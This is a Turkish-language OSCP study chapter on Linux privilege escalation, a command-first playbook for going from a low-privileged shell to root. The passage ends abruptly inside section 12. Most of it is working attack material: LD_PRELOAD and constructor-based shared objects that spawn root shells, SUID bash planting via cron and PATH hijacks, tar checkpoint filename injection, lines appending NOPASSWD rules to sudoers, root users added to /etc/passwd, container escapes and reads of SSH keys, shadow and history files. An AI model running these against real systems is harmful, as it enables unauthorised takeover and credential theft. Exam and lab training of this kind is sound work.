---
title: "Bölüm 5 — Linux Yetki Yükseltme"
date: 2026-10-22 13:00:00 +0300
categories: [OSCP, Privilege Escalation]
tags: [linux, privesc, suid, sudo, cron, capabilities]
oscp: true
toc: true
permalink: /oscp/05-linux-privesc/
---
{% raw %}
Bu bölüm, düşük yetkili bir Linux shell'i aldıktan sonra root'a çıkmak için kullanılan
tekniklerin komut-first referansıdır. Akış: **manuel hızlı keşif → otomatik keşif
(linpeas/pspy) → yapılandırma hataları (sudo/SUID/capability/cron) → servis ve grup
kaçışları (docker/lxd/NFS) → son çare kernel exploit'i.** Windows tarafı için
[Bölüm 4](/oscp/04-windows-privesc/)'e bakın; AD ortamında yetki yükseltme sonrası
hareket için [Bölüm 6](/oscp/06-ad-enumerasyon/) ve [Bölüm 7](/oscp/07-ad-saldirilari/).

---

## 1. Hızlı manuel keşif (ilk 5 dakika)

### 1.1 Kim olduğumuz, sistem ne, kernel ne
**Ne / ne zaman:** Her shell'de ilk komutlar. Sistem, kernel, mimari ve grup üyelikleri
atak vektörünü belirler.

```bash
id                          # gruplar: docker, lxd, adm, sudo ? → vektör seç
whoami && w                 # kimler login, kim ne yapıyor
uname -a && uname -r        # kernel → exploit suggester girdisi
cat /etc/os-release         # dağıtım + sürüm (DirtyCow/OverlayFS için kritik)
cat /proc/version
lscpu                       # mimari (x86_64 / i686 → exploit derleme hedefi)
hostname && cat /etc/hostname
sudo -V                     # sudo sürümü → CVE-2019-14287 / CVE-2019-18634
```

**Tuzaklar / notlar:**
- `sudo -V` her kullanıcı çalıştırabilir; sürüm < 1.8.28 ise `!root` bypass'ına bak.
- Dağıtım sürümü (`os-release`) eksikse `/etc/*issue` ve `/etc/*release` dene.
- Container/VM içindeysen kernel exploit host'u değil sanallaştırma katmanını hedefler;
  önce `post/linux/gather/checkcontainer` mantığını elle doğrula: `ls /.dockerenv`,
  `cat /proc/1/cgroup | grep -E "docker|lxc|kubepods"`.

### 1.2 Ağ, dinlenen portlar, servisler
**Ne / ne zaman:** Yatay hareket ve yetki yükseltme köprüleri (yerel servis,
yazılabilir config, veritabanı) için.

```bash
netstat -antp 2>/dev/null || ss -antp   # dinlenen portlar (root'suz -p kısmen boş)
ps auxww | grep root                    # root olarak çalışan süreçler
ls -l /bin /usr/bin /usr/sbin/ | less   # elle derlenmiş binary var mı
cat /etc/resolv.conf                    # iç DNS → AD ortamı işaretçisi (Bölüm 6)
route && netstat -rn                    # diğer subnet'ler → pivot (Bölüm 8)
cat /etc/hosts /etc/networks
lpstat                                  # yazıcı kuyruğu → hassas doküman?
```

**Tuzaklar / notlar:**
- `ss -antp` çalışmıyorsa `/proc/net/tcp` oku; root shell'i sonrası tekrar dene.
- Yerel yalnızca 127.0.0.1'de dinleyen servisler (MySQL, Redis, yönetim arayüzü)
  yetki yükseltme köprüsüdür — bölüm 9'a bak.

### 1.3 Dosya sistemi, mount, sürücüler
**Ne / ne zaman:** Yazılabilir dizin, kimlik bilgisi içeren fstab ve ek disk taraması.

```bash
mount && cat /etc/fstab                 # no_root_squash, kimlik bilgisi, mount opsiyonları
lsblk && df -h                          # ek disk / bölüm var mı
grep -Ei "user|pass|cred" /etc/fstab    # mount kimlik bilgisi arama
find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null   # herkese açık yazılabilir dizinler
find / -writable -type f 2>/dev/null | grep -v /proc          # yazılabilir dosyalar
ls -l /tmp /var/tmp /dev/shm            # kalıcı tmp dizinleri (not: /tmp reboot'ta silinir)
```

**Tuzaklar / notlar:**
- fstab'da kimlik bilgisi bulursan `mount <paylaşım>` ile anında yeni erişim elde edersin.
- `find / -writable` çıktısı çok büyük olur; `grep -vE "^/proc|^/sys"` ile sadeleştir.

### 1.4 Kullanıcılar, geçmiş, gizli dosyalar
**Ne / ne zaman:** Parola yeniden kullanımı ve hassas dosya avcılığı.

```bash
cat /etc/passwd                         # format: kullanıcı:x:uid:gid:açıklama:home:shell
cat /etc/group && getent group sudo     # grup üyelikleri
lastlog                                 # kim ne zaman login olmuş
find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null | grep <KULLANICI>   # gizli dosyalar
cat /home/*/.bash_history 2>/dev/null   # parola / komut geçmişi
cat /home/*/.ssh/id_rsa 2>/dev/null     # özel anahtar → 0600 ile kaydet
env                                     # ortam değişkenlerinde parola olabilir
crunch 6 6 -t Lab%%% > wordlist         # bildiğin parola kalıbından kelime listesi üret
```

**Tuzaklar / notlar:**
- `/etc/passwd` içinde `x` yerine hash görürsen (eski sistem) hash'i direkt kır.
- `.bash_history` boşsa `HISTFILE` farklı olabilir veya `history -c` atılmıştır; `~/.mysql_history`,
  `~/.python_history`, `~/.viminfo` gibi diğer history dosyalarına da bak.

---

## 2. Otomatik keşif araçları

### 2.1 LinPEAS (birincil tarayıcı)
**Ne / ne zaman:** Manuel keşiften hemen sonra; sistemin tamamını tarar ve renkli
output ile olası vektörleri işaretler.

```bash
# Kendi makineden kurban üzerinde çalıştır (kalıcı hedefe indir)
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh 2>/dev/null | tee /tmp/lp.out

# Çok uzunsa yalnızca uyarıları al
grep -iE "warning|color|red|yellow" /tmp/lp.out | less
```

**Tuzaklar / notlar:**
- LinPEAS çıktısı çok gürültülüdür; **her "Possible PE" gerçek açık değildir.**
  Her iddiayı manuel komutla doğrula (`sudo -l`, `getcap` vb.).
- Hedef internete çıkıyorsa `curl` yerine yerel sunucudan `wget http://<ATTACKER_IP>/linpeas.sh` indir.
- Cron job keşfi için linpeas yeterli olmayabilir; mutlaka pspy ile dinamik doğrula (2.3).

### 2.2 unix-privesc-check ve diğerleri
**Ne / ne zaman:** LinPEAS alternatifi/ikincil doğrulama.

```bash
./unix-privesc-check standard > output.txt
grep -i warning output.txt
```

**Tuzaklar / notlar:**
- Eski araç; yeni dağıtımlarda çok FP üretir. LinPEAS ile çapraz doğrula.

### 2.3 pspy — root'suz süreç dinleme
**Ne / ne zaman:** Cron/servis tetiklemelerini root yetkisi olmadan görmek için.
procfs taramasıyla diğer kullanıcıların çalıştırdığı komutları yakalar.

```bash
./pspy64 -pf -i 1000        # komut + dosya sistemi olayları, 1 sn tarama aralığı
```

**Tuzaklar / notlar:**
- Cron görevi dosyada görünmüyorsa (ör. systemd timer, /etc/cron.d altı) pspy yakalar.
- pspy statik binary'dir; libc uyumsuzluğu yaşanmaz, hedefe doğrudan atılabilir.

### 2.4 linux-exploit-suggester (kernel CVE eşleştirme)
**Ne / ne zaman:** Yapılandırma hataları tükendiğinde; kernel sürümünü CVE listesiyle eşler.

```bash
uname -r
./linux-exploit-suggester-2.pl -k <KERNEL_SURUMU>     # kurban üzerinde veya yerelde -k ile
./les.sh                                               # alternatif suggester
```

**Tuzaklar / notlar:**
- Suggester her eşleşmeyi **olası** sayar; sürümün gerçekten etkilendiğini ve exploit'in
  mimariyle uyumlu olduğunu doğrulamadan derleme/yükleme yapma.
- Kernel exploit'leri sistemi çökerebilir; önce stabil config vektörlerini tüket
  (bölüm 1–9 sırasına sadık kal).

---

## 3. SUDO kötüye kullanımı

### 3.1 sudo -l ve GTFOBins triyajı
**Ne / ne zaman:** Kullanıcının parolasız veya parolayla sudo ile çalıştırabildiği
komutlar listelenir; liste GTFOBins ile taranır.

```bash
sudo -l
# Çıktıdaki her binary'yi GTFOBins'de kontrol et:
#   https://gtfobins.github.io/  → "sudo" bölümü

# Yüklü paketleri listele + GTFOBins isimleriyle çaprazla
apt list --installed 2>/dev/null | tr "/" " " | cut -d" " -f1,3 | sed 's/[0-9]://g' | tee pkgs.list
for i in $(curl -s https://gtfobins.github.io/ | html2text | cut -d" " -f1 | sed '/^[[:space:]]*$/d'); do
  grep -q "^$i " pkgs.list && echo "GTFOBin: $i"
done
```

**Tuzaklar / notlar:**
- `sudo -l` parola isterse mevcut shell parolasını dene; kullanılan parola genelde aynıdır.
- `(ALL) NOPASSWD: ALL` görürsen işlem bitti: `sudo su -`.
- Sadece belirli komut varsa önce GTFOBins, sonra bu bölümdeki bypass teknikleri (3.2–3.5).

### 3.2 CVE-2019-14287 — sudo < 1.8.28 "!root" bypass
**Ne / ne zaman:** `sudo -l` çıktısında `(ALL, !root)` ifadesi varsa; sudo, kullanıcının
root OLMAYAN herhangi bir kullanıcı olarak komut çalıştırmasına izin veriyor demektir,
ama -1 UID numarası ile root elde edilir.

```bash
sudo -l
# (ALL, !root) NOPASSWD: /bin/bash

sudo -u#-1 /bin/bash        # -1 → uid 0'a yuvarlanır → root shell
# veya spesifik komut için:
sudo -u#<UID> <KOMUT>       # herhangi bir kullanıcı gibi komut çalıştırma (genel biçim)
```

**Tuzaklar / notlar:**
- PoC: https://www.exploit-db.com/exploits/47502
- Sadece `sudo -V` < 1.8.28 sistemlerde çalışır; yeni sürümde girdi reddedilir.

### 3.3 env_keep += LD_PRELOAD
**Ne / ne zaman:** `sudo -l` defaults satırında `env_keep+=LD_PRELOAD` varsa ve
herhangi bir komut sudo ile çalıştırılabiliyorsa; hedef binary GTFOBin bile olmasa
çalışır — çünkü binary başlamadan önce bizim kütüphanemiz root olarak yüklenir.

```bash
# root.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}

gcc -fPIC -shared -o /tmp/x.so root.c -nostartfiles
sudo LD_PRELOAD=/tmp/x.so <sudo-ile-calisan-herhangi-bir-komut>
```

**Tuzaklar / notlar:**
- `env_reset` defaults'da olsa `env_keep` listelenen değişkenleri korur — kombinasyon kritik.
- Binary çökerse bile `_init` çalışır; çıktı shell'in açıldığını garanti eder.

### 3.4 env_keep ile PATH hijack (sudo içinden)
**Ne / ne zaman:** `env_keep+=LD_LIBRARY_PATH` varsa .so injection; sudo ile çalışan
script göreli komut çağırıyorsa sudo-ortamı PATH'i manipüle edilebilir.

```bash
# SUID-binary .so injection varyantı (sudoers değil, SUID binary için):
strace <SUID-BINARY> 2>&1 | grep -iE "open|access|no such file"
# "open("/path/to/.config/libcalc.so", O_RDONLY) = -1 ENOENT" → hedef .so yolu bulundu

cat > /path/to/.config/libcalc.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
static void inject() __attribute__((constructor));
void inject(){ system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p"); }
EOF
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
<SUID-BINARY>        # tekrar çalıştır → root shell
```

**Tuzaklar / notlar:**
- Hedef yolun yazılabilir olması gerekir; yoksa yetkili olmayan bir dizine `gcc -o` yazamazsın.
- SUID binary **tam yol** ile kütüphane çağırıyorsa PATH değil, LD_LIBRARY_PATH /
  .so injection dene.

### 3.5 sudo editör/man/vim kaçışları
**Ne / ne zaman:** sudo ile `man`, `vim`, `less`, `nano` gibi sayfalayıcı/editör
çalıştırma izni varsa; içinden komut çalıştırılır.

```bash
sudo man somecommand
# man içinde:
!/bin/bash

sudo vim /etc/anything
# vim içinde:
:!/bin/bash
# veya yazma yetkisi de varsa GTFOBins vim tekniğiyle rootshell dosyası üret

sudo less /etc/anything
# less içinde: !/bin/bash
```

**Tuzaklar / notlar:**
- Bu, sudoers'da görünen komutun "sadece okuma" amaçlı verildiği senaryolarda klasik
  atlanan vektördür. `/etc/sudoers` düzenleme gerekiyorsa her zaman `sudo visudo` kullanılır
  (elle düzenleme sistemi bozar).

### 3.6 CVE-2019-18634 — sudo pwfeedback buffer overflow
**Ne / ne zaman:** sudo < 1.8.26 ve `pwfeedback` aktifse (parola girerken `*` yıldız
basıyorsa); girişte buffer overflow ile root.

```bash
sudo -l          # parola isterken ekranda * basıyor mu? → pwfeedback aktif
# PoC: https://github.com/saleemrashid/sudo-cve-2019-18634
```

**Tuzaklar / notlar:**
- Yıldız basması = `Defaults pwfeedback` açık demektir; yoksa vektör geçersiz.

---

## 4. SUID / SGID

### 4.1 Tarama ve triyaj
**Ne / ne zaman:** Dosya sahibinin yetkisiyle çalışan binary'ler; root'a ait SUID
binary'ler GTFOBins'de araştırılır.

```bash
find / -perm -u=s -type f 2>/dev/null
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null   # SUID-root
find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null   # SUID+SGID root

file <binary>        # script mi binary mi (script SUID'leri çoğu zaman bypass edilebilir)
strings <SUID-BINARY> | grep -E "/"    # çağırılan komutları / yolları göster
```

**Tuzaklar / notlar:**
- Script (sh/python) SUID binary'leri çoğu Linux'te etkisizdir; hangi yorumlayıcının
  çalıştığını bulup ona odaklan (`/usr/bin/python3 script.py` → python3 üzerinden vektör).
- Standart SUID binary'ler (`/bin/su`, `/usr/bin/sudo`, `passwd`...) gürültüdür; aşina
  olmadığın her entry'yi GTFOBins'de ara.

### 4.2 PATH hijack ile SUID sömürme
**Ne / ne zaman:** SUID binary, çağırdığı komutu **göreli isimle** çağırıyorsa
(`system("service apache2 start")` gibi); PATH'i kendi dizinimize yönlendirip
sahte binary koyarız.

```bash
strings <SUID-BINARY> | grep -E "^[a-z]+$"     # göreli çağrılan komutlar (ör. service)

echo 'int main(){ setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/service.c
gcc /tmp/service.c -o /tmp/service
export PATH=/tmp:$PATH
<SUID-BINARY>         # artık /tmp/service çalışır → root
```

**Tuzaklar / notlar:**
- Binary komutu **tam yolla** çağırıyorsa (`/usr/sbin/service`) PATH atlamaz;
  4.3 function injection dene.
- Sahte binary SUID bitinden faydalanmak için `setuid(0)` çağırmalı; yoksa
  yalnızca mevcut kullanıcıyla shell açar.

### 4.3 Bash function injection
**Ne / ne zaman:** SUID binary tam yolu belirterek komut çağırıyorsa (`/usr/sbin/service`
gibi); bash'de bu isimde bir fonksiyon export edilebilir ve SUID süreç onu çalıştırır.

```bash
# SUID binary "/usr/sbin/service apache2 start" çağırıyorsa:
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
/usr/local/bin/suid-env2
```

**Tuzaklar / notlar:**
- HackTricks kuralı: SUID dosyanın çağırdığı komutun ismi neyse, o isimde fonksiyon
  tanımla ve export et.
- `/tmp/bash -p` şart: SUID bash yetkisiz durumlarda euid'yi düşürür, `-p` korur.

### 4.4 SUID aracılığıyla parola/şifreli veri toplama
**Ne / ne zaman:** SUID binary GTFOBin barındırmıyorsa bile bilgi sızıntısı yapabilir
(ör. okuma izni olmayan dosyayı okuyan SUID `cat`/`cp`).

```bash
# Örnek: SUID find ile keyfi okuma
find /root -name "id_rsa" -exec cat {} \; 2>/dev/null
# Örnek: SUID tcpdump ile trafik yakalama (sudo ile de olur)
sudo tcpdump -i lo -A | grep -i "pass"
# Hizmet parolasını görmek için şüpheli süreçleri izle:
watch -n 1 "ps aux | grep pass"
```

---

## 5. Capabilities

### 5.1 Tarama ve tehlikeli capability'ler
**Ne / ne zaman:** SUID yerine ince taneli yetki veren capability'ler;
`cap_setuid`, `cap_setgid`, `cap_dac_override`, `cap_sys_admin` en tehlikelileri.

```bash
getcap -r / 2>/dev/null
find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \; 2>/dev/null
```

**Tuzaklar / notlar:**
- `+ep` = effective+permitted (sömürülebilir), `=eip` = inheritable de var (daha da geniş).
- `cap_net_raw` ping/mtr'de normaldir; öncelik yukarıdaki dört capability'dedir.
- Dağıtım güncellemeleri bazı binary'lerden capability'yi kaldırır; bulduysan
  sürüm/dağıtım ile uyumlu GTFOBins tekniğini dene.

### 5.2 cap_setuid sömürüsü (python/perl/php örnekleri)
**Ne / ne zaman:** Herhangi bir yorumlayıcıda `cap_setuid+ep` bulunduğunda; o
yorumlayıcı kendi sürecini uid 0 yapar.

```bash
getcap /usr/bin/python2.6        # cap_setuid+ep çıktıysa:
/usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# python3 için:
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
# perl için:
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
```

**Tuzaklar / notlar:**
- Sömürü için yorumlayıcıya **direkt çalıştırma yetkisi** yeterli; sudo gerekmez.

### 5.3 cap_dac_override sömürüsü
**Ne / ne zaman:** Dosya izin kontrollerini atlayan capability; vim gibi editörde
`/etc/passwd` veya `/etc/shadow` doğrudan yazılabilir.

```bash
getcap /usr/bin/vim.basic        # cap_dac_override=eip çıktıysa:
/usr/bin/vim.basic /etc/passwd

# İnteraktif olmayan modda root parolasını kaldırma (x'i sil):
echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd
head -n1 /etc/passwd             # root::0:0:... → su root parolasız girer
```

**Tuzaklar / notlar:**
- `cap_sys_admin` ayrıca mount/namespace işlemleriyle container escape'lere de açıktır;
  önce basit dosya yazma vektörünü dene.

---

## 6. PATH manipülasyonu (kullanıcı tarafı)

### 6.1 Yazılabilir PATH dizinine sahte binary
**Ne / ne zaman:** Mevcut kullanıcının PATH'inde kendi yazılabilir dizini öndeyse
(veya PATH'e ekleme yetkimiz varsa), sık kullanılan komutların sahtesi root
çalıştırıcısını yakalar.

```bash
echo $PATH
find $(echo $PATH | tr ':' ' ') -writable -type d 2>/dev/null   # PATH'te yazılabilir dizin var mı

# Genel desen: . PATH'e eklenirse cwd'deki sahte binary çalışır
PATH=.:${PATH} && export PATH
echo 'cp /bin/bash /tmp/bash && chmod +s /tmp/bash' > ls && chmod +x ls
# Bir üst kullanıcı ./ls diye çağırdığında → SUID bash hazır:
/tmp/bash -p
```

**Tuzaklar / notlar:**
- Neredeyse her zaman cron script'leri + azalan PATH'in birleşimiyle işler (bölüm 7.1).
- Sahte komut aynı çıktıyı üretmeli; aksi halde admin şüphelenir. `sleep 2` eklemek
  tespit şansını düşürür.

---

## 7. Cron job kötüye kullanımı

### 7.1 Keşif
**Ne / ne zaman:** Zamanlanmış görevler root olarak çalışırsa her bir yazılabilir
halka (dosya, PATH, argüman) root kapısıdır.

```bash
crontab -l && sudo crontab -l
ls -la /etc/cron* && cat /etc/crontab
cat /etc/cron.d/* /etc/cron.daily/* /etc/cron.hourly/* 2>/dev/null
grep "CRON" /var/log/syslog | tail -50          # ne zaman, hangi komut çalıştı?
cat /var/log/cron.log 2>/dev/null
./pspy64 -pf -i 1000                             # dinamik doğrulama (ayrıcalıksız)
```

**Tuzaklar / notlar:**
- Script root'a ait ama **dizin** kullanıcıya yazılabilirse dosyayı silip yerine
  sahtesi koyulabilir — `ls -ld` ile dizin iznine de bak, yalnızca dosyaya değil.
- systemd timer'lar için: `systemctl list-timers --all` ve ilgili unit dosyalarını incele.

### 7.2 Cron PATH abuse
**Ne / ne zaman:** crontab'da tanımlı PATH dizinlerinden birine yazma yetkimiz varsa
(veya komut göreli çağırıyorsa), o isimde SUID bash üreten script koyulur.

```bash
grep -i path /etc/crontab        # örn: PATH=/home/<KULLANICI>/bin:...

echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/<KULLANICI>/bin/<cagrilan-komut>
chmod +x /home/<KULLANICI>/bin/<cagrilan-komut>
# Cron tetiklenince:
/tmp/bash -p                     # -p olmadan SUID bash yetkiyi düşürür!
```

**Tuzaklar / notlar:**
- `cp /bin/bash /tmp/bash; chmod +s /tmp/bash` kalıbı her cron vektöründe tekrar kullanılır.
- Tetiklenmeyi beklerken `pspy` ile komutun gerçekten çalıştığını doğrula.

### 7.3 Cron wildcard (tar checkpoint) injection
**Ne / ne zaman:** Cron görevi root olarak `tar`, `rsync`, `chown`, `chmod` gibi bir
komutu **joker karakterle** çalıştırıyorsa (`tar -zcf backup.tar.gz *` gibi);
dosya adı olarak geçen argümanlar komuta enjekte edilir.

```bash
# crontab: */01 * * * * cd /home/<KULLANICI> && tar -zcf /home/<KULLANICI>/backup.tar.gz *
cd /home/<KULLANICI>

echo 'echo "<KULLANICI> ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
echo "" > "--checkpoint-action=exec=sh root.sh"
echo "" > --checkpoint=1

# Cron tetiklendiğinde tar, dosya adlarını argüman sanıp root.sh'yi çalıştırır.
# Sonra:
sudo -l && sudo su -
```

**Tuzaklar / notlar:**
- tar için `--checkpoint=1` + `--checkpoint-action=exec=sh <script>` çifti gereklidir.
- rsync için eşdeğer: `--rsync-path` veya `-e sh <script>` içeren dosya adları.
- Uzun cron periyotlarında test etmek için `pspy` ile tetiklenmeyi izle, sabırsızlıkla
  scripti bozma.

### 7.4 Cron file overwrite
**Ne / ne zaman:** Cron tarafından çalıştırılan script/dosyaya yazma yetkimiz varsa;
doğrudan root komutu eklenir.

```bash
ls -l /usr/local/bin/<cron-script>     # yazılabilir mi?
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /usr/local/bin/<cron-script>
# Tetikleme sonrası:
/tmp/bash -p
```

**Tuzaklar / notlar:**
- Script içindeki değişkenlerin/expansion'ların senin satırını bozmadığını kontrol et;
  gerekirse `;` yerine yeni satır + ayrı komut olarak ekle.

---

## 8. NFS — no_root_squash

### 8.1 Keşif ve sömürü
**Ne / ne zaman:** `/etc/exports` içinde `no_root_squash` ile dışa açılan dizin;
istemci root'u NFS üzerinden yazdığı dosyalarda **root uid'sini (0) korur** →
SUID binary bırakılır.

```bash
cat /etc/exports | grep -v "^#"        # no_root_squash aranır

# Saldırgan makinede (root olarak):
showmount -e <TARGET>
mkdir /tmp/nfs && mount -o rw,vers=2 <TARGET>:/tmp /tmp/nfs

# Host dosya sistemini root olarak görmek için privileged container:
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

**Tuzaklar / notlar:**
- Tüm adımlar **saldırgan makinede root** olarak yapılmalı; root_squash aktifse
  anon/nobody uid'sine squash olursun ve vektör ölür.
- gcc hedefte yoksa binary'yi kendi makinede derleyip `chown root:root` + `chmod +s`
  ile kurbana at; NFS uid 0'ı koruduğu için SUID bit korunur.
- `vers=2` bazı modern NFS sunucularında reddedilir; `vers=3`/`vers=4` dene.

---

## 9. Yapılandırma zafiyetleri ve servis köprüleri

### 9.1 Yazılabilir sistem dosyaları (config hijacking)
**Ne / ne zaman:** Root süreçlerinin okuduğu ama kullanıcıya yazılabilir config/script
dosyaları; komut enjeksiyonu veya parola eklemeyle yükseltilir.

```bash
find /etc -writable -type f 2>/dev/null          # kritik: sudoers, passwd, shadow, cron*
find / -not -type l -perm -o+w 2>/dev/null       # herkese yazılabilir dosyalar

# sudoers'a yetki ekleme (yazılabilirse):
echo "<KULLANICI> ALL=(root) NOPASSWD: ALL" >> /etc/sudoers
sudo -l
```

**Tuzaklar / notlar:**
- AppArmor (Debian/Ubuntu varsayılanı) bazı yolları korur; durumu root ile
  `aa-status` ile kontrol et. Profil aktifse vektör engellenebilir.

### 9.2 Yerel veritabanı köprüsü (MySQL/UDF mantığı)
**Ne / ne zaman:** Yalnızca localhost'ta dinleyen MySQL'e erişim varsa (config'de
parola, servis kullanıcısı, yedek dosyaları); DBA yetkisiyle User-Defined Function
ile sistem komutu çalıştırılır.

```bash
# Web config'lerinde DB parolası ara
grep -rEi "pass|db_" /var/www/ 2>/dev/null | head
mysql -u <KULLANICI> -p<PAROLA> -e "select version();"

# DBA isen (klasik UDF priv-esc genel mantığı — sürüm uyumlu .so gerekir):
# 1) UDF plugin dizinini bul:  SHOW VARIABLES LIKE 'plugin_dir';
# 2) lib_mysqludf_sys benzeri paylaşımlı kütüphaneyi dizine kopyala
# 3) CREATE FUNCTION sys_exec RETURNS int SONAME 'udf.so';
# 4) SELECT sys_exec('cp /bin/bash /tmp/bash; chmod +s /tmp/bash');
```

**Tuzaklar / notlar:**
- MySQL root'u sistem root'u DEĞİLDİR; yalnızca DBA + dosya yazma (plugin dizini)
  kombinasyonu vektör üretir. UDF .so'su hedef sürüm/mimariyle uyumlu derlenmelidir.
- Redis yerel erişimliyse: config dizini yazılabilirse SSH key / cron bırak (genel mantık:
  keyli dizine `CONFIG SET dir` + `dbfilename`).

### 9.3 Firewall yönetimi köprüsü
**Ne / ne zaman:** Kullanıcıya `ufw`/`iptables` yönetimi sudo ile verilmişse veya
firewall script'i yazılabilirse; kural dosyasına komut sızdırılır veya kural devre
dışı bırakılarak dış servis açılır.

```bash
cat /etc/iptables/rules.v4 2>/dev/null      # kural setini gör
sudo -l | grep -E "ufw|iptables|firewall"  # yönetim yetkisi var mı
# sudo ufw varsa GTFOBins'de 'ufw' → !/bin/bash editör kaçışı yoksa;
# kural ekleme/çıkarma ile dışarıdan erişimi aç (yerinden yönetim hedefi için)
```

**Tuzaklar / notlar:**
- Güvenlik duvarı değişikliği IDS/IPS tarafından görülebilir; müdahale öncesi mevcut
  kuralları kanıt olarak sakla, sonra geri yükle.

### 9.4 adm grup ve log madenciliği
**Ne / ne zaman:** `id` çıktısında `adm` grubu varsa `/var/log` tamamı okunabilir;
parola, token, cron komut satırları loglardan toplanır.

```bash
id | grep adm
grep -rEi "pass(word)?=|token|secret" /var/log/ 2>/dev/null | head -30
cat /var/log/auth.log 2>/dev/null | grep -E "password|COMMAND"
```

**Tuzaklar / notlar:**
- Doğrudan root vermez ama kimlik bilgisi + cron görünürlüğü sağlar; bölüm 7
  keşfini hızlandırır.

---

## 10. Container / sanallaştırma kaçışları

### 10.1 docker grup escape
**Ne / ne zaman:** `id` çıktısında `docker` grubu varsa bu pratikte rootshell demektir;
container'a host kök dizini mount edilerek chroot yapılır.

```bash
docker images
docker run -v /:/mnt --rm -it <IMAGE> chroot /mnt sh

# Alternatif: yalnızca hedef dizin
docker run -v /root:/mnt -it <IMAGE>
# /mnt içinde root'un SSH anahtarları, /etc/shadow kopyalanabilir
```

**Tuzaklar / notlar:**
- Image yoksa yerel registry'den uyumlu bir image çekilemezse, `docker import` ile
  statik bir binary'den minimal image oluşturulabilir.
- `docker` grubu üyeliği root ile eşdeğerdir — raporda her zaman kritik bulgu.

### 10.2 LXD/LXC grup escape
**Ne / ne zaman:** Ubuntu tabanlı sistemlerde `lxd` grubu üyeliği; privileged
container açılıp host kök dosya sistemi container'a bağlanır.

```bash
# Saldırgan makinede: alpine image hazırla (kurbanda image yoksa)
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder && sudo ./build-alpine -a i686

# Kurban üzerinde:
lxc image import ./alpine*.tar.gz --alias privimg
lxc image list
lxc init privimg privesc -c security.privileged=true
# "storage pool yok" hatası verirse: lxc storage create mypool dir && tekrar init
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
lxc start privesc
lxc exec privesc /bin/bash        # çalışmazsa /bin/sh
# Host FS artık /mnt/root altında
```

**Tuzaklar / notlar:**
- "storage pool yok" hatası klasiktir: `lxc storage create mypool dir` çözümü unutma.
- Kurban üzerinde yerel image yoksa hazırlanan image'i `scp`/HTTP ile taşı.
- Kullanıcımdan yetki devralma notu: lxc/lxd daemon genelde root çalışır; istemci
  yetkisi grup üyeliğinden gelir — `id`'de kontrol et.

---

## 11. /etc/passwd, /etc/shadow ve kimlik bilgisi kırma

### 11.1 Yazılabilir /etc/passwd → yeni root kullanıcı
**Ne / ne zaman:** /etc/passwd herkese yazılabilirse (veya cap_dac_override/UID
trick ile yazılabiliyorsa); hash'li sahte root kullanıcı eklenir.

```bash
ls -l /etc/passwd        # yazılabilir mi?
openssl passwd <PAROLA>  # veya: openssl passwd -1 -salt abc <PAROLA>
# çıktı: Fdzt.eqJQ4s0g (des-crypt) / $1$abc$... (md5crypt)

echo "root2:<HASH>:0:0:root:/root:/bin/bash" >> /etc/passwd
su root2                 # parolayı gir → uid=0(root)
```

**Tuzaklar / notlar:**
- uid:gid **0:0** olmalı; aksi halde "root2" adıyla root olmazsın.
- Alternatif: mevcut root satırındaki `x`'i silmek (parolasız `su root`); ama bu
  daha gürültülüdür, yeni kullanıcı eklemek tercih edilir.

### 11.2 /etc/shadow okunabiliyorsa hash kırma
**Ne / ne zaman:** shadow okuma yetkisi varsa (LFI, adm, cap_dac_override, hashdump
modülü); hash algoritması `$1`=MD5, `$5`=SHA-256, `$6`=SHA-512 ile belirlenir ve kırılır.

```bash
cat /etc/shadow | grep root          # root:$6$salt$hash:...
# Metasploit ile: post/linux/gather/hashdump → loot dosyası
# MSF'de otomatik kırma: auxiliary/analyze/crack_linux

# john (algoritma hash'ten otomatik anlaşılır):
john --format=sha512crypt shadow.txt -w /usr/share/wordlists/rockyou.txt

# hashcat (sha512crypt = -m 1800, sha256crypt = -m 7400, md5crypt = -m 500):
hashcat -a 0 -m 1800 shadow.txt /usr/share/wordlists/rockyou.txt
```

**Tuzaklar / notlar:**
- Hash formatı `/etc/passwd` satırıyla birleştirilerek MSF loot formatına
  (`kullanıcı:hash:0:0:...:/bin/bash`) getirilmelidir; `crack_linux` bunu ister.
- MSF session'ı Meterpreter'a yükseltmek için: shell'i Ctrl+Z ile bırak,
  `sessions -u <ID>`.

### 11.3 Yerel parola yeniden kullanımı
**Ne / ne zaman:** Kırılan herhangi bir kullanıcı parolası önce `sudo -l` ve
`su root` için denenir; lab/gerçek ortamda aynı parola sık sık root'u da açar.

```bash
su root                  # bulunan parolayı dene
sudo -l && sudo su -     # aynı parola sudo için
```

---

## 12. Kernel exploit'leri (son çare)

### 12.1 Mantık ve hazırlık
**Ne / ne zaman:** Tüm yapılandırma vektörleri tükendiğinde; kernel sürümünde bilinen
CVE varsa (DirtyCow/overlayfs/pkexec sınıfı) ve stabilite kaybı kabul edilebilirse.

```bash
uname -r && cat /etc/os-release
